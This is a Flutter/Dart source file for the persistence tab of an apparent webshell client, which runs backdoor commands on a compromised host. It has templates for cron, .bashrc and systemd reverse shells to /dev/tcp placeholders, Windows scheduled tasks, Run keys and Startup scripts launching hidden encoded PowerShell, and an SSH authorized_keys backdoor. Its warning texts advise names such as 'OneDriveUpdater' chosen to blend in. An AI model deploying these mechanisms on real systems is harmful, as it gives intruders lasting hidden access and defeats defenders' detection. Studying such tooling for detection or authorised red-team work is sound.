import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../services/webshell_service.dart';
import '../theme/app_theme.dart';
// ─── Data models ───────────────────────────────────────────────────────────────

class _PersistParam {
  final String id;
  final String label;
  final String hint;
  final String defaultValue;
  final bool multiline;
  const _PersistParam({
    required this.id,
    required this.label,
    required this.hint,
    required this.defaultValue,
    this.multiline = false,
  });
}

class _PersistMethod {
  final String id;
  final String name;
  final String description;
  final String checkCommand;
  final String deployTemplate;
  final String verifyTemplate;
  final List<_PersistParam> params;
  final String warningText;
  final bool isWindows;
  const _PersistMethod({
    required this.id,
    required this.name,
    required this.description,
    required this.checkCommand,
    required this.deployTemplate,
    required this.verifyTemplate,
    required this.params,
    required this.warningText,
    this.isWindows = false,
  });
}

class _PersistGroup {
  final String id;
  final String title;
  final IconData icon;
  final Color color;
  final List<_PersistMethod> methods;
  const _PersistGroup({
    required this.id,
    required this.title,
    required this.icon,
    required this.color,
    required this.methods,
  });
}

// ─── Static persistence methods ────────────────────────────────────────────────

/// All methods. Platform filtering is done via [isWindows].
const _allMethods = <_PersistMethod>[
  // ── Scheduled Tasks ──────────────────────────────────────────────────────
  _PersistMethod(
    id: 'cron_job',
    name: 'Cron Job',
    description:
        'Add a periodic crontab entry to trigger a reverse shell or payload.',
    checkCommand: 'crontab -l 2>&1 || echo "(no crontab or empty)"',
    deployTemplate: r"(crontab -l 2>/dev/null; echo '{schedule} {command}') | crontab -",
    verifyTemplate: r"crontab -l 2>&1 | grep -F '{command}' || echo '(entry not found in crontab)'",
    params: [
      _PersistParam(
        id: 'schedule',
        label: 'Schedule',
        hint: 'e.g. */5 * * * *',
        defaultValue: '*/5 * * * *',
      ),
      _PersistParam(
        id: 'command',
        label: 'Command',
        hint: "e.g. bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
        defaultValue: r"bash -c 'bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1'",
      ),
    ],
    warningText:
        'A crontab entry will be appended. The existing crontab will NOT be deleted.',
  ),
  _PersistMethod(
    id: 'scheduled_task',
    name: 'Scheduled Task',
    description:
        'Create a Windows scheduled task to run a payload at a specified interval.',
    checkCommand:
        r'schtasks /query /fo LIST 2>&1 | findstr /C:"TaskName:"',
    deployTemplate:
        r'schtasks /create /tn "{task_name}" /tr "{command}" /sc {schedule} /f',
    verifyTemplate: r'schtasks /query /tn "{task_name}" /fo LIST 2>&1',
    params: [
      _PersistParam(
        id: 'task_name',
        label: 'Task name',
        hint: 'e.g. WindowsUpdateChecker',
        defaultValue: 'WindowsUpdateChecker',
      ),
      _PersistParam(
        id: 'command',
        label: 'Command',
        hint: 'e.g. powershell -enc ...',
        defaultValue:
            'powershell -c "start-process cmd -argumentlist \'/c ping -n 30 127.0.0.1 & powershell -enc REPLACE_PAYLOAD\' -windowstyle hidden"',
      ),
      _PersistParam(
        id: 'schedule',
        label: 'Schedule',
        hint: 'minute / hourly / daily / onstart',
        defaultValue: 'hourly',
      ),
    ],
    warningText:
        'This creates a named scheduled task visible in Task Scheduler. Choose a name that blends in.',
    isWindows: true,
  ),

  // ── Login Triggers ───────────────────────────────────────────────────────
  _PersistMethod(
    id: 'bashrc_backdoor',
    name: 'Shell Profile (.bashrc)',
    description:
        'Append a command to ~/.bashrc, triggered on every interactive shell login.',
    checkCommand:
        r'found=0; for f in "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.profile"; do [ -f "$f" ] && echo "=== $f ===" && tail -20 "$f" 2>&1 && found=1; done; [ "$found" = 0 ] && echo "(no shell profile found)"',
    deployTemplate: r"echo -e '\n{command} &' >> $HOME/.bashrc",
    verifyTemplate: r'tail -5 "$HOME/.bashrc" 2>&1',
    params: [
      _PersistParam(
        id: 'command',
        label: 'Command',
        hint: "e.g. bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        defaultValue: r"bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1",
      ),
    ],
    warningText:
        'The command will be appended to ~/.bashrc and runs on every new interactive shell. It may leave a visible trace.',
  ),
  _PersistMethod(
    id: 'registry_run',
    name: 'Registry Run Key',
    description:
        r'Add an entry to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.',
    checkCommand:
        r'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2>&1',
    deployTemplate:
        r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "{entry_name}" /t REG_SZ /d "{command}" /f',
    verifyTemplate:
        r'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "{entry_name}" 2>&1',
    params: [
      _PersistParam(
        id: 'entry_name',
        label: 'Entry name',
        hint: 'e.g. OneDriveUpdater',
        defaultValue: 'OneDriveUpdater',
      ),
      _PersistParam(
        id: 'command',
        label: 'Command',
        hint: 'e.g. powershell -enc ...',
        defaultValue: r'powershell -enc BASE64_PAYLOAD',
      ),
    ],
    warningText:
        'The registry entry will appear in Autoruns. Use a plausible name.',
    isWindows: true,
  ),
  _PersistMethod(
    id: 'startup_folder',
    name: 'Startup Folder',
    description:
        'Write a .bat file to the user Startup folder, triggered on login.',
    checkCommand:
        r'dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" 2>&1',
    deployTemplate:
        r'echo {command} > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{payload_name}"',
    verifyTemplate:
        r'dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{payload_name}" 2>&1',
    params: [
      _PersistParam(
        id: 'payload_name',
        label: 'File name',
        hint: 'e.g. update_check.bat',
        defaultValue: 'update_check.bat',
      ),
      _PersistParam(
        id: 'command',
        label: 'Batch command',
        hint: 'e.g. @echo off & start /b powershell -enc ...',
        defaultValue:
            r'@echo off & start /b powershell -windowstyle hidden -enc BASE64_PAYLOAD',
      ),
    ],
    warningText:
        'The .bat file will be visible in the Startup folder. A console window may briefly flash on login.',
    isWindows: true,
  ),

  // ── Service Backdoors ────────────────────────────────────────────────────
  _PersistMethod(
    id: 'ssh_authorized_keys',
    name: 'SSH Authorized Keys',
    description:
        'Append a public key to ~/.ssh/authorized_keys for passwordless SSH access.',
    checkCommand:
        r'[ -f "$HOME/.ssh/authorized_keys" ] && cat "$HOME/.ssh/authorized_keys" 2>&1 || echo "(no authorized_keys at \$HOME/.ssh)"',
    deployTemplate:
        r"mkdir -p $HOME/.ssh && echo '{ssh_pubkey}' >> $HOME/.ssh/authorized_keys && chmod 600 $HOME/.ssh/authorized_keys",
    verifyTemplate: r'tail -1 "$HOME/.ssh/authorized_keys" 2>&1',
    params: [
      _PersistParam(
        id: 'ssh_pubkey',
        label: 'SSH public key',
        hint: 'ssh-rsa AAAAB3...',
        defaultValue: 'ssh-rsa AAAAB3...REPLACE_WITH_YOUR_PUBKEY',
        multiline: true,
      ),
    ],
    warningText:
        'A public key will be appended to authorized_keys. Ensure the corresponding private key is kept secure.',
  ),
  _PersistMethod(
    id: 'systemd_service',
    name: 'systemd User Service',
    description:
        'Create a user-level systemd service unit that runs a payload on boot.',
    checkCommand:
        r'ls "$HOME/.config/systemd/user/"*.service 2>&1 || echo "(no user systemd services at \$HOME/.config/systemd/user)"',
    deployTemplate:
        r"mkdir -p $HOME/.config/systemd/user && printf '[Unit]\nDescription={service_name}\n\n[Service]\nExecStart={command}\nRestart=no\n\n[Install]\nWantedBy=default.target\n' > $HOME/.config/systemd/user/{service_name}.service && systemctl --user daemon-reload 2>&1; systemctl --user enable {service_name}.service 2>&1 && echo 'OK: service enabled' || echo 'WARN: service created but enable failed (check --user availability)'",
    verifyTemplate:
        r"systemctl --user status {service_name}.service 2>&1 || systemctl --user list-unit-files 2>&1 | grep '{service_name}' || echo '(service not found)'",
    params: [
      _PersistParam(
        id: 'service_name',
        label: 'Service name',
        hint: 'e.g. dbus-cache',
        defaultValue: 'dbus-cache',
      ),
      _PersistParam(
        id: 'command',
        label: 'ExecStart command',
        hint: 'e.g. /bin/bash -c ...',
        defaultValue: r'/bin/bash -c "bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1"',
      ),
    ],
    warningText:
        'A user systemd service will be created and enabled. It persists across reboots and is visible in systemctl --user list-units.',
  ),
];

final _allGroups = <_PersistGroup>[
  _PersistGroup(
    id: 'scheduled',
    title: 'Scheduled Tasks',
    icon: Icons.schedule,
    color: AppColors.cyan,
    methods: [
      _findMethod('cron_job'),
      _findMethod('scheduled_task'),
    ],
  ),
  _PersistGroup(
    id: 'login',
    title: 'Login Triggers',
    icon: Icons.login,
    color: AppColors.amber,
    methods: [
      _findMethod('bashrc_backdoor'),
      _findMethod('registry_run'),
      _findMethod('startup_folder'),
    ],
  ),
  _PersistGroup(
    id: 'service',
    title: 'Service Backdoors',
    icon: Icons.settings,
    color: AppColors.primary,
    methods: [
      _findMethod('ssh_authorized_keys'),
      _findMethod('systemd_service'),
    ],
  ),
];

_PersistMethod _findMethod(String id) =>
    _allMethods.firstWhere((m) => m.id == id);

List<_PersistGroup> _buildGroups(bool isWindows) {
  return _allGroups.map((g) {
    final applicable =
        g.methods.where((m) => m.isWindows == isWindows).toList();
    if (applicable.isEmpty) return null;
    return _PersistGroup(
      id: g.id,
      title: g.title,
      icon: g.icon,
      color: g.color,
      methods: applicable,
    );
  }).whereType<_PersistGroup>().toList();
}

// ─── Main tab ──────────────────────────────────────────────────────────────────

class PersistenceTab extends StatefulWidget {
  final WebshellService service;
  const PersistenceTab({super.key, required this.service});

  @override
  State<PersistenceTab> createState() => _PersistenceTabState();
}

class _PersistenceTabState extends State<PersistenceTab>
    with AutomaticKeepAliveClientMixin {
  final Map<String, String?> _checkResults = {};
  final Map<String, String?> _deployResults = {};
  final Map<String, bool> _running = {};
  final Map<String, bool> _deploying = {};
  bool _runningAll = false;

  late final List<_PersistGroup> _groups;

  @override
  void initState() {
    super.initState();
    _groups = _buildGroups(widget.service.isWindowsTarget);
  }

  @override
  bool get wantKeepAlive => true;

  String _ckey(String methodId) => 'check/$methodId';
  String _dkey(String methodId) => 'deploy/$methodId';

  Future<void> _runCheck(_PersistMethod method) async {
    final key = _ckey(method.id);
    setState(() => _running[key] = true);
    try {
      final out = await widget.service.executeCommand(method.checkCommand);
      if (mounted) {
        setState(() {
          _checkResults[key] = out.trim().isEmpty ? '(no output)' : out.trim();
          _running[key] = false;
        });
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _checkResults[key] = '[Error] $e';
          _running[key] = false;
        });
      }
    }
  }

  Future<void> _runAllChecks() async {
    setState(() => _runningAll = true);
    for (final g in _groups) {
      for (final m in g.methods) {
        await _runCheck(m);
      }
    }
    if (mounted) setState(() => _runningAll = false);
  }

  void _clearAll() => setState(() {
    _checkResults.clear();
    _deployResults.clear();
    _running.clear();
    _deploying.clear();
  });

  Future<void> _executeDeploy(_PersistMethod method, String cmd,
      {String? verifyCmd}) async {
    final dkey = _dkey(method.id);
    setState(() => _deploying[dkey] = true);
    try {
      final out = await widget.service.executeCommand(cmd);
      if (mounted) {
        setState(() {
          _deployResults[dkey] =
              out.trim().isEmpty ? '(no output)' : out.trim();
          _deploying[dkey] = false;
        });
      }

      // Auto-verify after successful deploy
      if (verifyCmd != null && mounted) {
        await Future.delayed(const Duration(milliseconds: 500));
        final vkey = 'verify/${method.id}';
        setState(() => _running[vkey] = true);
        try {
          final vout = await widget.service.executeCommand(verifyCmd);
          if (mounted) {
            setState(() {
              _checkResults[vkey] =
                  vout.trim().isEmpty ? '(no output)' : vout.trim();
              _running[vkey] = false;
            });
          }
        } catch (e) {
          if (mounted) {
            setState(() {
              _checkResults[vkey] = '[Error] $e';
              _running[vkey] = false;
            });
          }
        }
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _deployResults[dkey] = '[Error] $e';
          _deploying[dkey] = false;
        });
      }
    }
  }

  Future<void> _onDeployPressed(_PersistMethod method) async {
    // Step 1: Parameter dialog
    final controllers = <String, TextEditingController>{};
    for (final p in method.params) {
      controllers[p.id] = TextEditingController(text: p.defaultValue);
    }

    final cmd = await showDialog<String>(
      context: context,
      builder: (ctx) => _PersistDeployDialog(
        method: method,
        controllers: controllers,
      ),
    );

    // Build verify command BEFORE disposing controllers
    String verifyCmd = method.verifyTemplate;
    for (final p in method.params) {
      verifyCmd =
          verifyCmd.replaceAll('{${p.id}}', controllers[p.id]!.text);
    }

    // Dispose controllers
    for (final c in controllers.values) {
      c.dispose();
    }

    if (cmd == null || !mounted) return;

    // Step 2: Final confirmation
    final confirmed = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Row(
          children: [
            const Icon(Icons.warning_amber_rounded,
                color: AppColors.red, size: 22),
            const SizedBox(width: 8),
            Text('Final confirmation',
                style: AppTextStyles.heading(size: 16)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: AppColors.red.withValues(alpha: 0.08),
                borderRadius: BorderRadius.circular(6),
                border: Border.all(
                    color: AppColors.red.withValues(alpha: 0.3)),
              ),
              child: Text(
                method.warningText,
                style: AppTextStyles.caption(
                    size: 12, color: AppColors.red),
              ),
            ),
            const SizedBox(height: 12),
            Text('Command preview',
                style: AppTextStyles.body(
                    size: 13, color: AppColors.textPrimary)),
            const SizedBox(height: 8),
            Container(
              width: double.infinity,
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: AppColors.bgDark,
                borderRadius: BorderRadius.circular(6),
                border: Border.all(color: AppColors.border),
              ),
              child: SelectableText(
                cmd,
                style: const TextStyle(
                  fontFamily: 'Monaco',
                  fontFamilyFallback: ['Courier New', 'monospace'],
                  fontSize: 11,
                  color: AppColors.cyan,
                ),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx, false),
            child: Text('Cancel',
                style: AppTextStyles.caption(size: 13)),
          ),
          FilledButton(
            onPressed: () => Navigator.pop(ctx, true),
            style: FilledButton.styleFrom(
              backgroundColor: AppColors.red,
            ),
            child: Text('Deploy',
                style: AppTextStyles.body(
                    size: 13, color: Colors.white)),
          ),
        ],
      ),
    );

    if (confirmed == true && mounted) {
      await _executeDeploy(method, cmd, verifyCmd: verifyCmd);
    }
  }

  @override
  Widget build(BuildContext context) {
    super.build(context);
    var checkDone = 0;
    var checkTotal = 0;
    for (final g in _groups) {
      checkTotal += g.methods.length;
      for (final m in g.methods) {
        if (_checkResults[_ckey(m.id)] != null) checkDone++;
      }
    }

    return Column(
      children: [
        // Header
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
          color: AppColors.bgElevated,
          child: Row(
            children: [
              const Icon(Icons.link, color: AppColors.amber, size: 16),
              const SizedBox(width: 8),
              Text(
                'Persistence mechanisms',
                style: AppTextStyles.heading(
                    size: 14, color: AppColors.amber),
              ),
              if (checkDone > 0) ...[
                const SizedBox(width: 8),
                Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 6, vertical: 2),
                  decoration: BoxDecoration(
                    color: AppColors.amber.withValues(alpha: 0.15),
                    borderRadius: BorderRadius.circular(4),
                  ),
                  child: Text(
                    '$checkDone/$checkTotal',
                    style: AppTextStyles.caption(
                        size: 11, color: AppColors.amber),
                  ),
                ),
              ],
              const Spacer(),
              if (checkDone > 0)
                TextButton.icon(
                  onPressed: _runningAll ? null : _clearAll,
                  icon: const Icon(Icons.delete_sweep_outlined,
                      size: 14),
                  label: Text('Clear'),
                  style: TextButton.styleFrom(
                    foregroundColor: AppColors.textSecondary,
                    padding:
                        const EdgeInsets.symmetric(horizontal: 8),
                  ),
                ),
              const SizedBox(width: 4),
              FilledButton.icon(
                onPressed: _runningAll ? null : _runAllChecks,
                icon: _runningAll
                    ? const SizedBox(
                        width: 12,
                        height: 12,
                        child: CircularProgressIndicator(
                          strokeWidth: 1.5,
                          color: Colors.white,
                        ),
                      )
                    : const Icon(Icons.play_arrow_rounded, size: 15),
                label: Text(_runningAll
                    ? 'Checking all…'
                    : 'Check all'),
                style: FilledButton.styleFrom(
                  backgroundColor: AppColors.amber,
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(
                      horizontal: 12, vertical: 6),
                  textStyle: AppTextStyles.body(size: 13),
                ),
              ),
            ],
          ),
        ),
        Expanded(
          child: ListView(
            padding:
                const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            children: [
              // Groups
              ..._groups.map(
                (group) => _PersistGroupWidget(
                  group: group,
                  checkResults: _checkResults,
                  deployResults: _deployResults,
                  running: _running,
                  deploying: _deploying,
                  ckey: _ckey,
                  dkey: _dkey,
                  onCheck: _runCheck,
                  onDeploy: _onDeployPressed,
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }

}

// ─── Deploy dialog ─────────────────────────────────────────────────────────────

class _PersistDeployDialog extends StatefulWidget {
  final _PersistMethod method;
  final Map<String, TextEditingController> controllers;

  const _PersistDeployDialog({
    required this.method,
    required this.controllers,
  });

  @override
  State<_PersistDeployDialog> createState() => _PersistDeployDialogState();
}

class _PersistDeployDialogState extends State<_PersistDeployDialog> {
  String _buildCommand() {
    var cmd = widget.method.deployTemplate;
    for (final p in widget.method.params) {
      final val = widget.controllers[p.id]?.text ?? p.defaultValue;
      cmd = cmd.replaceAll('{${p.id}}', val);
    }
    return cmd;
  }

  @override
  void initState() {
    super.initState();
    for (final c in widget.controllers.values) {
      c.addListener(_onParamChanged);
    }
  }

  void _onParamChanged() {
    setState(() {}); // rebuild command preview
  }

  @override
  void dispose() {
    for (final c in widget.controllers.values) {
      c.removeListener(_onParamChanged);
    }
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final cmd = _buildCommand();

    return AlertDialog(
      title: Text(widget.method.name,
          style: AppTextStyles.heading(size: 16)),
      content: SizedBox(
        width: 500,
        child: SingleChildScrollView(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              // Warning
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: AppColors.red.withValues(alpha: 0.08),
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(
                      color: AppColors.red.withValues(alpha: 0.3)),
                ),
                child: Row(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Icon(Icons.warning_amber_rounded,
                        color: AppColors.red, size: 18),
                    const SizedBox(width: 8),
                    Expanded(
                      child: Text(
                        widget.method.warningText,
                        style: AppTextStyles.caption(
                            size: 12, color: AppColors.red),
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 16),
              // Parameters
              ...widget.method.params.map((p) => Padding(
                    padding: const EdgeInsets.only(bottom: 12),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text('${p.label} ${'(required)'}',
                            style: AppTextStyles.body(
                                size: 12,
                                color: AppColors.textSecondary)),
                        const SizedBox(height: 4),
                        TextField(
                          controller: widget.controllers[p.id],
                          maxLines: p.multiline ? 5 : 1,
                          minLines: p.multiline ? 3 : 1,
                          style: const TextStyle(
                            fontFamily: 'Monaco',
                            fontFamilyFallback: [
                              'Courier New',
                              'monospace'
                            ],
                            fontSize: 12,
                            color: AppColors.textPrimary,
                          ),
                          decoration: InputDecoration(
                            hintText: p.hint,
                            hintStyle: const TextStyle(
                              fontSize: 11,
                              color: AppColors.textMuted,
                            ),
                            contentPadding: const EdgeInsets.all(10),
                            filled: true,
                            fillColor: AppColors.bgDark,
                            border: OutlineInputBorder(
                              borderRadius:
                                  BorderRadius.circular(6),
                              borderSide: const BorderSide(
                                  color: AppColors.border),
                            ),
                            focusedBorder: OutlineInputBorder(
                              borderRadius:
                                  BorderRadius.circular(6),
                              borderSide: BorderSide(
                                  color: AppColors.primary
                                      .withValues(alpha: 0.5)),
                            ),
                          ),
                        ),
                      ],
                    ),
                  )),
              const SizedBox(height: 12),
              // Live command preview
              Text('Command preview',
                  style: AppTextStyles.body(
                      size: 13, color: AppColors.textPrimary)),
              const SizedBox(height: 6),
              Container(
                width: double.infinity,
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: AppColors.bgDark,
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: AppColors.border),
                ),
                child: SelectableText(
                  cmd,
                  style: const TextStyle(
                    fontFamily: 'Monaco',
                    fontFamilyFallback: [
                      'Courier New',
                      'monospace'
                    ],
                    fontSize: 11,
                    color: AppColors.cyan,
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context, null),
          child: Text('Cancel',
              style: AppTextStyles.caption(size: 13)),
        ),
        FilledButton(
          onPressed: () => Navigator.pop(context, cmd),
          style: FilledButton.styleFrom(
            backgroundColor: AppColors.red,
          ),
          child: Text('Deploy',
              style: AppTextStyles.body(
                  size: 13, color: Colors.white)),
        ),
      ],
    );
  }
}

// ─── Group widget ──────────────────────────────────────────────────────────────

class _PersistGroupWidget extends StatelessWidget {
  final _PersistGroup group;
  final Map<String, String?> checkResults;
  final Map<String, String?> deployResults;
  final Map<String, bool> running;
  final Map<String, bool> deploying;
  final String Function(String) ckey;
  final String Function(String) dkey;
  final void Function(_PersistMethod) onCheck;
  final void Function(_PersistMethod) onDeploy;

  const _PersistGroupWidget({
    required this.group,
    required this.checkResults,
    required this.deployResults,
    required this.running,
    required this.deploying,
    required this.ckey,
    required this.dkey,
    required this.onCheck,
    required this.onDeploy,
  });

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: const EdgeInsets.only(bottom: 8),
            child: Row(
              children: [
                Icon(group.icon, size: 14, color: group.color),
                const SizedBox(width: 6),
                Text(
                  group.title,
                  style: AppTextStyles.heading(
                      size: 13, color: group.color),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: Divider(
                    color: group.color.withValues(alpha: 0.25),
                    height: 1,
                  ),
                ),
              ],
            ),
          ),
          ...group.methods.map((method) => _PersistMethodWidget(
                method: method,
                color: group.color,
                checkResult: checkResults[ckey(method.id)],
                deployResult: deployResults[dkey(method.id)],
                verifyResult: checkResults['verify/${method.id}'],
                isRunning: running[ckey(method.id)] == true,
                isDeploying: deploying[dkey(method.id)] == true,
                isVerifying: running['verify/${method.id}'] == true,
                onCheck: () => onCheck(method),
                onDeploy: () => onDeploy(method),
              )),
        ],
      ),
    );
  }
}

// ─── Method item widget ────────────────────────────────────────────────────────

class _PersistMethodWidget extends StatelessWidget {
  final _PersistMethod method;
  final Color color;
  final String? checkResult;
  final String? deployResult;
  final String? verifyResult;
  final bool isRunning;
  final bool isDeploying;
  final bool isVerifying;
  final VoidCallback onCheck;
  final VoidCallback onDeploy;

  const _PersistMethodWidget({
    required this.method,
    required this.color,
    required this.checkResult,
    required this.deployResult,
    this.verifyResult,
    required this.isRunning,
    required this.isDeploying,
    this.isVerifying = false,
    required this.onCheck,
    required this.onDeploy,
  });

  @override
  Widget build(BuildContext context) {
    final hasCheck = checkResult != null;
    final hasDeploy = deployResult != null;
    final hasVerify = verifyResult != null;
    final isCheckError =
        checkResult?.startsWith('[Error]') == true;
    final isDeployError =
        deployResult?.startsWith('[Error]') == true;
    final isVerifyError =
        verifyResult?.startsWith('[Error]') == true;

    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      decoration: BoxDecoration(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(8),
        border: Border.all(
          color: hasCheck
              ? (isCheckError
                  ? AppColors.red.withValues(alpha: 0.4)
                  : color.withValues(alpha: 0.3))
              : AppColors.border,
        ),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding:
                const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        method.name,
                        style: AppTextStyles.body(
                            size: 13, color: AppColors.textPrimary),
                      ),
                      const SizedBox(height: 2),
                      Text(
                        method.description,
                        style: AppTextStyles.caption(
                            size: 11, color: AppColors.textMuted),
                      ),
                      const SizedBox(height: 5),
                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 6, vertical: 3),
                        decoration: BoxDecoration(
                          color: AppColors.bgDark,
                          borderRadius: BorderRadius.circular(4),
                        ),
                        child: Text(
                          method.checkCommand.length > 64
                              ? '${method.checkCommand.substring(0, 64)}…'
                              : method.checkCommand,
                          style: const TextStyle(
                            fontFamily: 'Monaco',
                            fontFamilyFallback: [
                              'Courier New',
                              'monospace'
                            ],
                            fontSize: 10.5,
                            color: AppColors.textSecondary,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 10),
                // Check + Deploy buttons
                Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(
                      width: 68,
                      height: 28,
                      child: isRunning
                          ? Center(
                              child: SizedBox(
                                width: 14,
                                height: 14,
                                child: CircularProgressIndicator(
                                  strokeWidth: 1.5,
                                  color: color,
                                ),
                              ),
                            )
                          : OutlinedButton(
                              onPressed: onCheck,
                              style: OutlinedButton.styleFrom(
                                foregroundColor: color,
                                side: BorderSide(
                                    color: color.withValues(alpha: 0.6)),
                                padding: EdgeInsets.zero,
                                shape: RoundedRectangleBorder(
                                  borderRadius:
                                      BorderRadius.circular(6),
                                ),
                              ),
                              child: Text(
                                hasCheck ? 'Retry' : 'Check',
                                style: AppTextStyles.caption(
                                    size: 10, color: color),
                              ),
                            ),
                    ),
                    const SizedBox(height: 4),
                    SizedBox(
                      width: 68,
                      height: 28,
                      child: isDeploying
                          ? const Center(
                              child: SizedBox(
                                width: 14,
                                height: 14,
                                child: CircularProgressIndicator(
                                  strokeWidth: 1.5,
                                  color: AppColors.red,
                                ),
                              ),
                            )
                          : FilledButton(
                              onPressed: onDeploy,
                              style: FilledButton.styleFrom(
                                backgroundColor: AppColors.red
                                    .withValues(alpha: 0.8),
                                padding: EdgeInsets.zero,
                                shape: RoundedRectangleBorder(
                                  borderRadius:
                                      BorderRadius.circular(6),
                                ),
                              ),
                              child: Text(
                                'Deploy',
                                style: AppTextStyles.caption(
                                    size: 10, color: Colors.white),
                              ),
                            ),
                    ),
                  ],
                ),
              ],
            ),
          ),
          // Check result output
          if (hasCheck)
            _ResultOutput(
              result: checkResult!,
              isError: isCheckError,
            ),
          // Deploy result output
          if (hasDeploy)
            _ResultOutput(
              result: deployResult!,
              isError: isDeployError,
            ),
          // Post-deploy verify result
          if (isVerifying)
            Container(
              width: double.infinity,
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: AppColors.bgDark.withValues(alpha: 0.8),
                borderRadius: const BorderRadius.only(
                  bottomLeft: Radius.circular(8),
                  bottomRight: Radius.circular(8),
                ),
                border: const Border(
                  top: BorderSide(color: AppColors.border),
                ),
              ),
              child: Row(
                children: [
                  SizedBox(
                    width: 12,
                    height: 12,
                    child: CircularProgressIndicator(
                      strokeWidth: 1.5,
                      color: AppColors.primary,
                    ),
                  ),
                  const SizedBox(width: 8),
                  Text(
                    'Verifying...',
                    style: AppTextStyles.caption(
                        size: 11, color: AppColors.textMuted),
                  ),
                ],
              ),
            ),
          if (hasVerify)
            _ResultOutput(
              label: '✓ Verified',
              result: verifyResult!,
              isError: isVerifyError,
            ),
        ],
      ),
    );
  }
}

// ─── Result output widget ──────────────────────────────────────────────────────

class _ResultOutput extends StatelessWidget {
  final String result;
  final bool isError;
  final String? label;

  const _ResultOutput({
    required this.result,
    required this.isError,
    this.label,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      width: double.infinity,
      decoration: BoxDecoration(
        color: isError
            ? AppColors.red.withValues(alpha: 0.05)
            : AppColors.bgDark.withValues(alpha: 0.8),
        borderRadius: const BorderRadius.only(
          bottomLeft: Radius.circular(8),
          bottomRight: Radius.circular(8),
        ),
        border: Border(
          top: BorderSide(
            color: isError
                ? AppColors.red.withValues(alpha: 0.3)
                : AppColors.border,
          ),
        ),
      ),
      padding: const EdgeInsets.all(10),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          if (label != null)
            Padding(
              padding: const EdgeInsets.only(bottom: 4),
              child: Text(
                label!,
                style: AppTextStyles.caption(
                    size: 10,
                    color: isError ? AppColors.red : AppColors.primary),
              ),
            ),
          Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Expanded(
                child: SelectableText(
                  result,
                  style: TextStyle(
                    fontFamily: 'Monaco',
                    fontFamilyFallback: const [
                      'Courier New',
                      'monospace',
                    ],
                    fontSize: 11,
                    height: 1.5,
                    color: isError
                        ? AppColors.red
                        : AppColors.textSecondary,
                  ),
                ),
              ),
          const SizedBox(width: 6),
          IconButton(
            onPressed: () {
              Clipboard.setData(ClipboardData(text: result));
              ScaffoldMessenger.of(context).showSnackBar(
                SnackBar(
                  content: Text('Copied to clipboard'),
                  duration: const Duration(seconds: 1),
                  behavior: SnackBarBehavior.floating,
                ),
              );
            },
            icon: const Icon(Icons.copy_outlined, size: 16),
            style: IconButton.styleFrom(
              foregroundColor: AppColors.textSecondary,
              padding: const EdgeInsets.all(4),
              minimumSize: const Size(28, 28),
            ),
            tooltip: 'Copy',
          ),
        ],
      ),
      ],
      ),
    );
  }
}
